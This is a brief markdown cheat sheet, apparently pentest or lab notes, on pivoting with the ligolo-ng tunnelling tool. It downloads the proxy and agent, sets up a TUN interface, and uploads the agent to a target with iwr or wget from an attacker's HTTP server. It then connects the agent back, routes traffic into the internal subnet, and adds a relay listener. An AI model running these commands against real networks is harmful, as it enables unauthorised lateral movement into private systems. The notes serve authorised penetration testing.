### download proxy
```
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz

tar -xzvf ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz 
```

### download agent
#### windows
```
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_windows_amd64.zip 

unzip ligolo-ng_agent_0.5.2_windows_amd64.zip 
```
#### linux
```
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_linux_amd64.tar.gz

tar -xzvf ligolo-ng_agent_0.5.2_linux_amd64.tar.gz
```

### set proxy
```
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert
```

### upload agent
#### windows
```
iwr -UseBasicParsing http://ip:8000/agent.exe -outfile agent
```
#### linux
```
wget http://ip:8000/agent
```

### connect to proxy 
```
./agent -connect 192.168.45.x:11601 -ignore-cert
```

### chose session id
```
session
1
```

### add route
```
sudo ip route add ip/24 dev ligolo
```

### ligolo-ng start
```
start
```

### listener add
```
listener_add --addr 0.0.0.0:1235 --to 0.0.0.0:8000
```
